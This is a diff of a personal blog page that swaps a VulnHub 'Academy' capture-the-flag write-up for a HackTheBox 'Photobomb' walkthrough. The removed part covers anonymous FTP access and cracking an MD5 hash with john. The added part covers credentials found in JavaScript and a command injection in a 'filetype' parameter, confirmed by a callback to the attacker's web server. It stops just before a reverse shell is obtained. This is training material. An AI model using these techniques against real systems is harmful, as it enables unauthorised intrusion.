@@ -10,14 +10,14 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <meta http-equiv="X-UA-Compatible" content="ie=edge" />
   
-  <title>Academy &middot; 0x53CTF</title>
-  <meta name="title" content="Academy &middot; 0x53CTF" />
+  <title>HackTheBox Photobomb &middot; 0x53CTF</title>
+  <meta name="title" content="HackTheBox Photobomb &middot; 0x53CTF" />
   
   <meta name="description" content="My Personal Notes" />
   
   
   
-  <link rel="canonical" href="https://53ctf.github.io/posts/vulnhub/academy/" />
+  <link rel="canonical" href="https://53ctf.github.io/posts/htb/photobomb/" />
   
   
   
@@ -60,17 +60,17 @@
   
   
   
-  <meta property="og:title" content="Academy" />
-<meta property="og:description" content="Nmap&gt; Nmap # 21/tcp open ftp syn-ack vsftpd 3.0.3 | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:192.168.1.142 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 3 | vsFTPd 3." />
+  <meta property="og:title" content="HackTheBox Photobomb" />
+<meta property="og:description" content="Name: Photobomb IP: 10.10.11.182 Defficulty: Easy OS: Linux Author: slartibartfast Nmap&gt; Nmap # PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2." />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://53ctf.github.io/posts/vulnhub/academy/" /><meta property="og:image" content="https://53ctf.github.io/posts/vulnhub/academy/featured.jpg"/><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2023-02-05T12:53:48+05:30" />
-<meta property="article:modified_time" content="2023-02-05T12:53:48+05:30" /><meta property="og:site_name" content="0x53CTF" />
+<meta property="og:url" content="https://53ctf.github.io/posts/htb/photobomb/" /><meta property="og:image" content="https://53ctf.github.io/posts/htb/photobomb/featured.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-01-15T14:06:58+05:30" />
+<meta property="article:modified_time" content="2023-01-15T14:06:58+05:30" /><meta property="og:site_name" content="0x53CTF" />
 
   <meta name="twitter:card" content="summary_large_image"/>
-<meta name="twitter:image" content="https://53ctf.github.io/posts/vulnhub/academy/featured.jpg"/>
-<meta name="twitter:title" content="Academy"/>
-<meta name="twitter:description" content="Nmap&gt; Nmap # 21/tcp open ftp syn-ack vsftpd 3.0.3 | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:192.168.1.142 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 3 | vsFTPd 3."/>
+<meta name="twitter:image" content="https://53ctf.github.io/posts/htb/photobomb/featured.png"/>
+<meta name="twitter:title" content="HackTheBox Photobomb"/>
+<meta name="twitter:description" content="Name: Photobomb IP: 10.10.11.182 Defficulty: Easy OS: Linux Author: slartibartfast Nmap&gt; Nmap # PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2."/>
 
   
   <script type="application/ld+json">
@@ -78,26 +78,26 @@
     "@context": "https://schema.org",
     "@type": "Article",
     "articleSection": "Posts",
-    "name": "Academy",
-    "headline": "Academy",
+    "name": "HackTheBox Photobomb",
+    "headline": "HackTheBox Photobomb",
     
-    "abstract": "Nmap\u003e Nmap # 21\/tcp open ftp syn-ack vsftpd 3.0.3 | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:192.168.1.142 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 3 | vsFTPd 3.",
+    "abstract": "Name: Photobomb IP: 10.10.11.182 Defficulty: Easy OS: Linux Author: slartibartfast Nmap\u003e Nmap # PORT STATE SERVICE REASON VERSION 22\/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.",
     "inLanguage": "en",
-    "url" : "https:\/\/53ctf.github.io\/posts\/vulnhub\/academy\/",
+    "url" : "https:\/\/53ctf.github.io\/posts\/htb\/photobomb\/",
     "author" : {
       "@type": "Person",
       "name": "5YC10P5"
     },
     "copyrightYear": "2023",
-    "dateCreated": "2023-02-05T12:53:48\u002b05:30",
-    "datePublished": "2023-02-05T12:53:48\u002b05:30",
+    "dateCreated": "2023-01-15T14:06:58\u002b05:30",
+    "datePublished": "2023-01-15T14:06:58\u002b05:30",
     
-    "dateModified": "2023-02-05T12:53:48\u002b05:30",
+    "dateModified": "2023-01-15T14:06:58\u002b05:30",
     
-    "keywords": ["VulnHub","FTP","John","MD5","MySQL","CronJob"],
+    "keywords": ["HackTheBox","CommandInjection","PathInjection"],
     
     "mainEntityOfPage": "true",
-    "wordCount": "774"
+    "wordCount": "666"
   }]
   </script>
 
@@ -512,7 +512,7 @@ if (!doNotTrack) {
 
     
     <div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom"
-    style="background-image:url(/posts/vulnhub/academy/featured_hu4a6624161b80f5ce2d621dcee0283d8e_283828_1200x0_resize_q75_box.jpg);">
+    style="background-image:url(/posts/htb/photobomb/featured_hu9b9f416bc5c1bc746a7863329ce851ab_105832_1200x0_resize_box_3.png);">
     
 
 
@@ -565,8 +565,8 @@ if (!doNotTrack) {
   <li class="inline hidden">
     <a
       class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
-      href="/posts/vulnhub/academy/"
-      >Academy</a
+      href="/posts/htb/photobomb/"
+      >HackTheBox Photobomb</a
     ><span class="px-1 text-primary-500">/</span>
   </li>
 
@@ -575,7 +575,7 @@ if (!doNotTrack) {
 
     
     <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
-      Academy
+      HackTheBox Photobomb
     </h1>
     <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
       
@@ -618,7 +618,7 @@ if (!doNotTrack) {
 <div class="flex flex-row flex-wrap items-center">
   
   
-  <time datetime="2023-02-05 12:53:48 &#43;0530 &#43;0530">5 February 2023</time><span class="px-2 text-primary-500">&middot;</span><span>774 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">4 mins</span>
+  <time datetime="2023-01-15 14:06:58 &#43;0530 &#43;0530">15 January 2023</time><span class="px-2 text-primary-500">&middot;</span><span>666 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">4 mins</span>
   
 
   
@@ -656,67 +656,34 @@ if (!doNotTrack) {
   
   
   
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/vulnhub/&#34;,'_self');">
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/hackthebox/&#34;,'_self');">
     <span class="flex">
   <span
     class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
   >
-    VulnHub
+    HackTheBox
   </span>
 </span>
 
   </span>
   
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/ftp/&#34;,'_self');">
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/commandinjection/&#34;,'_self');">
     <span class="flex">
   <span
     class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
   >
-    FTP
+    CommandInjection
   </span>
 </span>
 
   </span>
   
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/john/&#34;,'_self');">
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/pathinjection/&#34;,'_self');">
     <span class="flex">
   <span
     class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
   >
-    John
-  </span>
-</span>
-
-  </span>
-  
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/md5/&#34;,'_self');">
-    <span class="flex">
-  <span
-    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
-  >
-    MD5
-  </span>
-</span>
-
-  </span>
-  
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/mysql/&#34;,'_self');">
-    <span class="flex">
-  <span
-    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
-  >
-    MySQL
-  </span>
-</span>
-
-  </span>
-  
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/cronjob/&#34;,'_self');">
-    <span class="flex">
-  <span
-    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
-  >
-    CronJob
+    PathInjection
   </span>
 </span>
 
@@ -745,15 +712,9 @@ if (!doNotTrack) {
     <nav id="TableOfContents">
   <ul>
     <li><a href="#nmap">Nmap</a></li>
-    <li><a href="#ftp-emuneration-https53ctfgithubiopostsvulnhubacademyftp-emuneration">FTP Emuneration <a href="https://53ctf.github.io/posts/vulnhub/academy/#ftp-emuneration">#</a></a></li>
-    <li><a href="#web-enumeration-https53ctfgithubiopostsvulnhubacademyweb-enumeration">Web Enumeration <a href="https://53ctf.github.io/posts/vulnhub/academy/#web-enumeration">#</a></a>
-      <ul>
-        <li><a href="#directory-fuzzing-https53ctfgithubiopostsvulnhubacademydirectory-fuzzing">Directory Fuzzing <a href="https://53ctf.github.io/posts/vulnhub/academy/#directory-fuzzing">#</a></a></li>
-      </ul>
-    </li>
-    <li><a href="#foothold-www-data-https53ctfgithubiopostsvulnhubacademyfoothold-www-data">Foothold [www-data] <a href="https://53ctf.github.io/posts/vulnhub/academy/#foothold-www-data">#</a></a></li>
-    <li><a href="#prives-grimmie-https53ctfgithubiopostsvulnhubacademyprives-grimmie">Prives [Grimmie] <a href="https://53ctf.github.io/posts/vulnhub/academy/#prives-grimmie">#</a></a></li>
-    <li><a href="#privesc-root-https53ctfgithubiopostsvulnhubacademyprivesc-root">Privesc [Root] <a href="https://53ctf.github.io/posts/vulnhub/academy/#privesc-root">#</a></a></li>
+    <li><a href="#web-enumeration">Web Enumeration</a></li>
+    <li><a href="#foothold-wizard">Foothold [Wizard]</a></li>
+    <li><a href="#privesc-root">Privesc [Root]</a></li>
   </ul>
 </nav>
   </div>
@@ -768,15 +729,9 @@ if (!doNotTrack) {
     <nav id="TableOfContents">
   <ul>
     <li><a href="#nmap">Nmap</a></li>
-    <li><a href="#ftp-emuneration-https53ctfgithubiopostsvulnhubacademyftp-emuneration">FTP Emuneration <a href="https://53ctf.github.io/posts/vulnhub/academy/#ftp-emuneration">#</a></a></li>
-    <li><a href="#web-enumeration-https53ctfgithubiopostsvulnhubacademyweb-enumeration">Web Enumeration <a href="https://53ctf.github.io/posts/vulnhub/academy/#web-enumeration">#</a></a>
-      <ul>
-        <li><a href="#directory-fuzzing-https53ctfgithubiopostsvulnhubacademydirectory-fuzzing">Directory Fuzzing <a href="https://53ctf.github.io/posts/vulnhub/academy/#directory-fuzzing">#</a></a></li>
-      </ul>
-    </li>
-    <li><a href="#foothold-www-data-https53ctfgithubiopostsvulnhubacademyfoothold-www-data">Foothold [www-data] <a href="https://53ctf.github.io/posts/vulnhub/academy/#foothold-www-data">#</a></a></li>
-    <li><a href="#prives-grimmie-https53ctfgithubiopostsvulnhubacademyprives-grimmie">Prives [Grimmie] <a href="https://53ctf.github.io/posts/vulnhub/academy/#prives-grimmie">#</a></a></li>
-    <li><a href="#privesc-root-https53ctfgithubiopostsvulnhubacademyprivesc-root">Privesc [Root] <a href="https://53ctf.github.io/posts/vulnhub/academy/#privesc-root">#</a></a></li>
+    <li><a href="#web-enumeration">Web Enumeration</a></li>
+    <li><a href="#foothold-wizard">Foothold [Wizard]</a></li>
+    <li><a href="#privesc-root">Privesc [Root]</a></li>
   </ul>
 </nav>
   </div>
@@ -830,201 +785,243 @@ if (!doNotTrack) {
       <div class="min-w-0 min-h-0 max-w-prose">
         
 
-        <div id="nmap" class="anchor">Nmap></div>
+        <ul>
+<li>Name: Photobomb</li>
+<li>IP: 10.10.11.182</li>
+<li>Defficulty: Easy</li>
+<li>OS: Linux</li>
+<li>Author: <a href="https://www.hackthebox.com/home/users/profile/85231"   target="_blank">
+    slartibartfast</a></li>
+</ul>
+<div id="nmap" class="anchor">Nmap></div>
 <h2 class="relative group">Nmap 
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
             style="text-decoration-line: none !important;" href="#nmap" aria-label="Anchor">#</a></span>        
     
-</h2><pre tabindex="0"><code>21/tcp open  ftp     syn-ack vsftpd 3.0.3
-| ftp-syst:
-|   STAT:
-| FTP server status:
-|      Connected to ::ffff:192.168.1.142
-|      Logged in as ftp
-|      TYPE: ASCII
-|      No session bandwidth limit
-|      Session timeout in seconds is 300
-|      Control connection is plain text
-|      Data connections will be plain text
-|      At session startup, client count was 3
-|      vsFTPd 3.0.3 - secure, fast, stable
-|_End of status
-| ftp-anon: Anonymous FTP login allowed (FTP code 230)
-|_-rw-r--r--    1 1000     1000          776 May 30  2021 note.txt
-22/tcp open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+</h2><pre tabindex="0"><code>PORT   STATE SERVICE REASON  VERSION
+22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey:
-|   2048 c744588690fde4de5b0dbf078d055dd7 (RSA)
-| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIBuDzM6D8xmqki4fcCb1uEhi1lmznDpxYuviaBAbbHjCbMgiNZHBQj2gPjZcFhcgHkr5TtWv0slV3IyhbOZLvhaZUZu3HS/sm/Tz3heAx3C50MX1DcPNw3EpTDrzAwM5EsgnEEjAXPMXXG8JQ3X5k5xEbe2BoCBc1ZAxuLAXc2l3RyL/vrXCO2HappsmoZuX8OPchvtHSqBDjyQB/BDeb5VszUXTnb+utkE9bbZrFbYsa3Ed5JgOWMaxieKArHlECTpqlkdp5vSJ58iefVHwkq5qE2fap3G1HmcoI9RMNIT1AohXRQ8Hk5jQDr2xY8q6PjKGsxnw5YVmV7dx8j6aX
-|   256 78ec470f0f53aaa6054884809476a623 (ECDSA)
-| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDch5BCc2rqpCaaWap74M3GZ5y9APegx7XQyPXXIvxBgowvdssDnp119M5t59+djVOEoWiqKnaT0GQRpJWBs2Ig=
-|   256 999c3911dd3553a0291120c7f8bf71a4 (ED25519)
-|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFHqfgMhJpRl/QNeg560fqH+J5jrVf0b/kUL9g94XZnp
-80/tcp open  http    syn-ack Apache httpd 2.4.38 ((Debian))
-|_http-server-header: Apache/2.4.38 (Debian)
-|_http-title: Apache2 Debian Default Page: It works
+|   3072 e22473bbfbdf5cb520b66876748ab58d (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCwlzrcH3g6+RJ9JSdH4fFJPibAIpAZXAl7vCJA+98jmlaLCsANWQXth3UsQ+TCEf9YydmNXO2QAIocVR8y1NUEYBlN2xG4/7txjoXr9QShFwd10HNbULQyrGzPaFEN2O/7R90uP6lxQIDsoKJu2Ihs/4YFit79oSsCPMDPn8XS1fX/BRRhz1BDqKlLPdRIzvbkauo6QEhOiaOG1pxqOj50JVWO3XNpnzPxB01fo1GiaE4q5laGbktQagtqhz87SX7vWBwJXXKA/IennJIBPcyD1G6YUK0k6lDow+OUdXlmoxw+n370Knl6PYxyDwuDnvkPabPhkCnSvlgGKkjxvqks9axnQYxkieDqIgOmIrMheEqF6GXO5zz6WtN62UAIKAgxRPgIW0SjRw2sWBnT9GnLag74cmhpGaIoWunklT2c94J7t+kpLAcsES6+yFp9Wzbk1vsqThAss0BkVsyxzvL0U9HvcyyDKLGFlFPbsiFH7br/PuxGbqdO9Jbrrs9nx60=
+|   256 04e3ac6e184e1b7effac4fe39dd21bae (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBrVE9flXamwUY+wiBc9IhaQJRE40YpDsbOGPxLWCKKjNAnSBYA9CPsdgZhoV8rtORq/4n+SO0T80x1wW3g19Ew=
+|   256 20e05d8cba71f08c3a1819f24011d29e (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEp8nHKD5peyVy3X3MsJCmH/HIUvJT+MONekDg5xYZ6D
+80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://photobomb.htb/
 | http-methods:
-|_  Supported Methods: HEAD GET POST OPTIONS
-Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
-</code></pre><p>Three ports are open.</p>
+|_  Supported Methods: GET HEAD POST OPTIONS
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><p>Two ports are open.</p>
 <ul>
-<li><strong>21/TCP FTP</strong>
+<li>22/TCP  SSH
 <ul>
-<li>vsftpd 3.0.3</li>
-<li>Anonymous FTP login allowed</li>
+<li>OpenSSH 8.2p1</li>
+<li>And its banner says that this is a <a href="https://launchpad.net/ubuntu/&#43;source/openssh/1:7.6p1-4ubuntu0.5"   target="_blank">
+    Ubuntu</a> box</li>
 </ul>
 </li>
-<li><strong>22/TCP SSH</strong>
+<li>80/TCP  HTTP
 <ul>
-<li>OpenSSH 7.9p1</li>
-<li>And its banner tells that this is a Debian machine</li>
+<li>nginx 1.18.0</li>
+<li>And its banner says that this is a <a href="https://launchpad.net/ubuntu/&#43;source/openssh/1:7.6p1-4ubuntu0.5"   target="_blank">
+    Ubuntu</a> box</li>
+<li>Add <code>photobomb.htb</code> into the <code>/etc/hosts</code></li>
 </ul>
 </li>
-<li><strong>80/TCP HTTP</strong></li>
 </ul>
-<div id="ftp-emuneration-https53ctfgithubiopostsvulnhubacademyftp-emuneration" class="anchor">FTP Emuneration <a href="https://53ctf.github.io/posts/vulnhub/academy/#ftp-emuneration"   target="_blank">
-    #</a>></div>
-<h2 class="relative group">FTP Emuneration <a href="https://53ctf.github.io/posts/vulnhub/academy/#ftp-emuneration"   target="_blank">
-    #</a> 
+<div id="web-enumeration" class="anchor">Web Enumeration></div>
+<h2 class="relative group">Web Enumeration 
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#ftp-emuneration-https53ctfgithubiopostsvulnhubacademyftp-emuneration" aria-label="Anchor">#</a></span>        
+            style="text-decoration-line: none !important;" href="#web-enumeration" aria-label="Anchor">#</a></span>        
     
-</h2><p>According to the Nmap results we could be able to login to the <code>FTP</code> server anonymously. So let’s login.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt;	ftp 192.168.1.136
-</span></span><span class="line"><span class="cl">Connected to 192.168.1.136.
-</span></span><span class="line"><span class="cl">Name <span class="o">(</span>192.168.1.136:syclops<span class="o">)</span>: anonymous
-</span></span><span class="line"><span class="cl"><span class="m">331</span> Please specify the password.
-</span></span><span class="line"><span class="cl">Password:
-</span></span><span class="line"><span class="cl"><span class="m">230</span> Login successful.
-</span></span></code></pre></div><p>We have only one file in available in the <code>FTP</code> server which is a text file named <code>note.txt</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ftp&gt; ls -lart
-</span></span><span class="line"><span class="cl">-rw-r--r--    <span class="m">1</span> <span class="m">1000</span>     <span class="m">1000</span>          <span class="m">776</span> May <span class="m">30</span>  <span class="m">2021</span> note.txt
-</span></span></code></pre></div><p>Let’s download and see whats in it.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ftp&gt; get note.txt
-</span></span><span class="line"><span class="cl"><span class="m">200</span> PORT <span class="nb">command</span> successful. Consider using PASV.
-</span></span><span class="line"><span class="cl"><span class="m">150</span> Opening BINARY mode data connection <span class="k">for</span> note.txt <span class="o">(</span><span class="m">776</span> bytes<span class="o">)</span>.
-</span></span><span class="line"><span class="cl"><span class="m">226</span> Transfer <span class="nb">complete</span>
-</span></span></code></pre></div><p><code>note.txt</code> contains this message.</p>
-<blockquote>
-<p>Hello Heath !</p>
-<p>Grimmie has setup the test website for the new academy. I told him not to use the same password everywhere, he will change it ASAP.</p>
-<p>I couldn’t create a user via the admin panel, so instead I inserted directly into the database with the following command:</p>
-<p>INSERT INTO ‘students’ (‘StudentRegno’, ‘studentPhoto’, ‘password’, ‘studentName’, ‘pincode’, ‘session’, ‘department’, ‘semester’, ‘cgpa’, ‘creationdate’, ‘updationDate’) VALUES (‘10201321’, ‘’, ‘cd73502828457d15655bbd7a63fb0bc8’, ‘Rum Ham’, ‘777777’, ‘’, ‘’, ‘’, ‘7.60’, ‘2021-05-29 14:36:56’, ‘’);</p>
-<p>The StudentRegno number is what you use for login.</p>
-<p>Le me know what you think of this open-source project, it’s from 2020 so it should be secure… right ? We can always adapt it to our needs.</p>
-<p>-jdelta</p>
-</blockquote>
-<p>So now we have a <code>StudentRegno</code> and a <code>password</code>. <code>10201321:cd73502828457d15655bbd7a63fb0bc8</code><br>
-This is a MD5 hash. So let’s crack it and get the actual password.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt;	<span class="nb">echo</span> <span class="s2">&#34;cd73502828457d15655bbd7a63fb0bc8&#34;</span> &gt; <span class="nb">hash</span>
-</span></span><span class="line"><span class="cl">&gt;	john --format<span class="o">=</span>raw-md5 -w<span class="o">=</span>/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt <span class="nb">hash</span>
-</span></span><span class="line"><span class="cl">student          <span class="o">(</span>?<span class="o">)</span>
-</span></span></code></pre></div><p>Now we have a valid set of credentials.<br>
-<code>10201321:student</code></p>
-<div id="web-enumeration-https53ctfgithubiopostsvulnhubacademyweb-enumeration" class="anchor">Web Enumeration <a href="https://53ctf.github.io/posts/vulnhub/academy/#web-enumeration"   target="_blank">
-    #</a>></div>
-<h2 class="relative group">Web Enumeration <a href="https://53ctf.github.io/posts/vulnhub/academy/#web-enumeration"   target="_blank">
-    #</a> 
+</h2><p>If we look at the source code of the <code>http://photobomb.htb/</code> you can find two interesting things.</p>
+<ul>
+<li>A directory <code>/printer</code></li>
+<li>A custom javasript name <code>photobomb.js</code>
+
+
+
+
+
+  
+  
+    
+  
+  
+    <figure>
+      
+      <img
+        class="my-0 rounded-md"
+        srcset="
+        /posts/htb/photobomb/images/source_hu39f51f20132654efdb450fdaf082808c_124068_330x0_resize_box_3.png 330w,
+        /posts/htb/photobomb/images/source_hu39f51f20132654efdb450fdaf082808c_124068_660x0_resize_box_3.png 660w,
+        /posts/htb/photobomb/images/source_hu39f51f20132654efdb450fdaf082808c_124068_1024x0_resize_box_3.png 1024w,
+        /posts/htb/photobomb/images/source_hu39f51f20132654efdb450fdaf082808c_124068_1320x0_resize_box_3.png 2x"
+        src="/posts/htb/photobomb/images/source_hu39f51f20132654efdb450fdaf082808c_124068_660x0_resize_box_3.png"
+        alt="Source Code"
+      />
+      
+      
+    </figure>
+  
+
+</li>
+</ul>
+<p>When we visit the <code>http://photobomb.htb/printer</code>, it asks us for credentials.
+But if visit the <code>http://photobomb.htb/photobomb.js</code>, we can see this piece of code which contains the credentials for <code>http://photobomb.htb/printer</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">init</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByClassName</span><span class="p">(</span><span class="s1">&#39;creds&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">setAttribute</span><span class="p">(</span><span class="s1">&#39;href&#39;</span><span class="p">,</span><span class="s1">&#39;http://p***0:b***!@photobomb.htb/printer&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="nx">init</span><span class="p">;</span>
+</span></span></code></pre></div><p>Let&rsquo;s login to <code>http://photobomb.htb/printer</code>. Once you&rsquo;ve logged into it, you can see its a site where you can download photos either as a <code>jpg</code> or <code>png</code>.</p>
+<div id="foothold-wizard" class="anchor">Foothold [Wizard]></div>
+<h2 class="relative group">Foothold [Wizard] 
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#web-enumeration-https53ctfgithubiopostsvulnhubacademyweb-enumeration" aria-label="Anchor">#</a></span>        
+            style="text-decoration-line: none !important;" href="#foothold-wizard" aria-label="Anchor">#</a></span>        
     
-</h2><p><code>http://192.168.1.136/</code> is just a defult apache homepage.</p>
-<div id="directory-fuzzing-https53ctfgithubiopostsvulnhubacademydirectory-fuzzing" class="anchor">Directory Fuzzing <a href="https://53ctf.github.io/posts/vulnhub/academy/#directory-fuzzing"   target="_blank">
-    #</a>></div>
-<h3 class="relative group">Directory Fuzzing <a href="https://53ctf.github.io/posts/vulnhub/academy/#directory-fuzzing"   target="_blank">
-    #</a> 
+</h2><p>After a while I found a <a href="https://owasp.org/www-community/attacks/Command_Injection"   target="_blank">
+    Command Injection</a>.</p>
+<p>If we capture the request of the download request of the png image, we can abuse the <code>filetype</code> parameter to get a <code>Command Injection</code> to working. Here is how we test it.</p>
+<p>Start a python web server.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; sudo python3 -m http.server <span class="m">80</span>
+</span></span><span class="line"><span class="cl">Serving HTTP on 0.0.0.0 port <span class="m">80</span> <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+</span></span></code></pre></div><p>In the BurpSuite, payload would be looks like this.
+
+
+
+
+
+  
+  
+    
+  
+  
+    <figure>
+      
+      <img
+        class="my-0 rounded-md"
+        srcset="
+        /posts/htb/photobomb/images/command_injection_test_hu342b84d4fcb3384692977a4a46b43c75_35639_330x0_resize_box_3.png 330w,
+        /posts/htb/photobomb/images/command_injection_test_hu342b84d4fcb3384692977a4a46b43c75_35639_660x0_resize_box_3.png 660w,
+        /posts/htb/photobomb/images/command_injection_test_hu342b84d4fcb3384692977a4a46b43c75_35639_1024x0_resize_box_3.png 1024w,
+        /posts/htb/photobomb/images/command_injection_test_hu342b84d4fcb3384692977a4a46b43c75_35639_1320x0_resize_box_3.png 2x"
+        src="/posts/htb/photobomb/images/command_injection_test_hu342b84d4fcb3384692977a4a46b43c75_35639_660x0_resize_box_3.png"
+        alt="Command Injection Test"
+      />
+      
+      
+    </figure>
+  
+
+</p>
+<p>And make sure to <strong>URLEncode</strong> the payload before you send it.
+
+
+
+
+
+  
+  
+    
+  
+  
+    <figure>
+      
+      <img
+        class="my-0 rounded-md"
+        srcset="
+        /posts/htb/photobomb/images/urlencoded_hu32c3ed7a0b46a5259045365b98a7412b_37493_330x0_resize_box_3.png 330w,
+        /posts/htb/photobomb/images/urlencoded_hu32c3ed7a0b46a5259045365b98a7412b_37493_660x0_resize_box_3.png 660w,
+        /posts/htb/photobomb/images/urlencoded_hu32c3ed7a0b46a5259045365b98a7412b_37493_1024x0_resize_box_3.png 1024w,
+        /posts/htb/photobomb/images/urlencoded_hu32c3ed7a0b46a5259045365b98a7412b_37493_1320x0_resize_box_3.png 2x"
+        src="/posts/htb/photobomb/images/urlencoded_hu32c3ed7a0b46a5259045365b98a7412b_37493_660x0_resize_box_3.png"
+        alt="URLEncoded"
+      />
+      
+      
+    </figure>
+  
+
+</p>
+<p>And when we send the request, we can see a hit on our python server.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">10.10.11.182 - - <span class="o">[</span>15/Jan/2023 16:00:03<span class="o">]</span> code 404, message File not found
+</span></span><span class="line"><span class="cl">10.10.11.182 - - <span class="o">[</span>15/Jan/2023 16:00:03<span class="o">]</span> <span class="s2">&#34;GET /CommandInjectionConfiremed HTTP/1.1&#34;</span> <span class="m">404</span> -
+</span></span></code></pre></div><p>Since we have a command injection, now we can get a reverse shell. So let&rsquo;s get one and capture the user flag.</p>
